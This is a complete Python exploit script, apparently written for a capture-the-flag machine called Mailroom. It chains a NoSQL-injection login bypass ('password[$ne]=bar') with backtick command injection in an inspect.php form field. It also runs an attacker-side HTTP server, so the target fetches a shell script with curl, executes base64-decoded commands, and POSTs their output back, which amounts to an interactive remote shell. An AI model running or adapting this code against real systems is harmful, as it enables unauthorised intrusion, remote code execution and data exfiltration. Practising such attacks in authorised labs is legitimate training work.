#!/usr/bin/env python3
from requests import post, Session, exceptions
from argparse import ArgumentParser
from base64 import b64encode
from uuid import uuid4
from http.server import HTTPServer, BaseHTTPRequestHandler
from threading import Thread
import re

HOST_HEADER = {"Host": "staff-review-panel.mailroom.htb"}

class ReceiverBaseServer(BaseHTTPRequestHandler):

    def log_message(self, *args):
        return

    def do_POST(self):
        self.send_response(200)
        
        bodySize = int(self.headers.get('Content-Length'))
        bodyBytes = self.rfile.read(bodySize)

        try:
            body = str(bodyBytes, "utf-8")
            print("\n" + body)
        except UnicodeDecodeError:
            outputFilename = "latestCommandOutput"
            print(f"Received non-unicode data. Writing data to './{outputFilename}'")
            with open(outputFilename, "wb") as output:
                output.write(bodyBytes)

    def do_GET(self):
        self.send_response(200)

        self.send_header("Content-Type", "text/plain")
        self.end_headers()
        
        self.wfile.write(self.server.shellFile.encode())

        triggerCommand = f"sh {self.server.filename}"
        try:
            Thread(target=self.server.executeRestrictedCommand, args=(triggerCommand,)).start()
        except exceptions.ReadTimeout:
            print("Execution command timed out")


class ResponderServer(HTTPServer):

    def __init__(self, lhost: str, lport: int, loggedInSession: Session, targetUrl: str):
        HTTPServer.__init__(self, (lhost, lport), ReceiverBaseServer)
        self.serverThread = None
        self.session = loggedInSession
        self.targetUrl = targetUrl
        self.shellFile = ""

    def executeCommand(self, command: str):
        lhost, lport = self.server_address
        self.shellFile = getCommandShellFile(command, lhost, lport)

        self.filename = f"/tmp/{uuid4().hex}"
        selfCallingCommand = f"curl -o {self.filename} {lhost}:{lport}"
        
        try:
            self.executeRestrictedCommand(selfCallingCommand)
        except exceptions.ReadTimeout:
            print("Self-calling request timed out")

    def executeRestrictedCommand(self, command: str):
        bannedCharsRegex = r"[\$<>;|&{}\(\)\[\]\'\"]"
        if re.findall(bannedCharsRegex, command):
            filteredCommand = re.sub(bannedCharsRegex, '', command)
            print(f"[WARNING] Command \"{command}\" is using banned chars!\nThe final command will be \"{filteredCommand}\"")

        vulnerableEndpoint = self.targetUrl + "inspect.php"
        payload = {"inquiry_id": f"`{command}`"}
        postHeaders = {"Content-Type": "application/x-www-form-urlencoded"}
        postHeaders.update(HOST_HEADER)

        try:
            self.session.post(vulnerableEndpoint, data=payload, headers=postHeaders, timeout=4)
        except exceptions.ReadTimeout:
            print("Restricted command execution timed out")

    def start(self):
        if self.serverThread != None:
            print("Server already running")
        thread = Thread(target=self.serve_forever, daemon=True)
        self.serverThread = thread
        thread.start()

    def stop(self):
        if self.serverThread == None:
            print("Server is not running")
        self.shutdown()
        self.serverThread.join()

def getCommandShellFile(command: str, lhost: str, lport: int) -> str:
    b64Command = str(b64encode(command.encode()), "utf-8")
    tmpFilename = uuid4().hex

    commandToFile = f"echo {b64Command} | base64 -d | sh | tee /tmp/{tmpFilename}"
    sendResponseCommand = f"curl -X POST http://{lhost}:{lport} --data-binary '@/tmp/{tmpFilename}'"
    cleanup = f"rm /tmp/{tmpFilename}"

    return f"#!/bin/bash\n{commandToFile};{sendResponseCommand};{cleanup}"

def getArguments():
    parser = ArgumentParser(description="Authenticated command injection in staff-review-panel.mailroom.htb")
    parser.add_argument("-l", "--lhost", required=True, help="Listening host")
    parser.add_argument("-p", "--lport", required=False, type=int, default=4444, help="Listening port (Default: 4444)")
    parser.add_argument("-u", "--url", required=True, help="Staff panel url (e.g: http://mysite.com/)")
    return parser.parse_args()

def formatUrl(url: str) -> str:
    if not url.startswith("http"):
        url = f"http://{url}"
    if not url.endswith('/'):
        url += '/'
    return url

def send2FAMail(url: str):
    authUrl = url + "auth.php"
    headers = {"Content-Type": "application/x-www-form-urlencoded"}
    headers.update(HOST_HEADER)
    loginData = "email=tristan@mailroom.htb&password[$ne]=bar"

    print("Sending 2FA mail...")
    try:
        post(authUrl, headers=headers, data=loginData, timeout=10)
        print("2FA Mail sent! Check your inbox")
    except:
        print("2FA mail request timed out")

def startInteractiveRCE(responder: ResponderServer):
    print("Press Ctrl+C to quit")
    while True:
        command = input("\n$ ")
        try:
            responder.executeCommand(command)
        except exceptions.ReadTimeout:
            print("Command execution timed-out")

def getLoggedInSession(url: str) -> Session:
    session = Session()
    authUrl = url + "auth.php"
    while(True):
        send2FAMail(url)
        token = input("Please enter the 2FA token:\n> ")

        tokenParam = {"token": token}
        response = session.get(authUrl, params=tokenParam, headers=HOST_HEADER)
        contentType = response.headers.get("Content-Type")
        if contentType != "application/json":
            print("Login successful")
            break

        print("Invalid token")
    return session

def main():
    args = getArguments()
    url = formatUrl(args.url)
    session = getLoggedInSession(url)
    responder = ResponderServer(args.lhost, args.lport, session, url)

    responder.start()
    try:
        startInteractiveRCE(responder)
    except KeyboardInterrupt:
        pass
    responder.stop()

if __name__ == "__main__":
    main()
    print("\nQuitting")

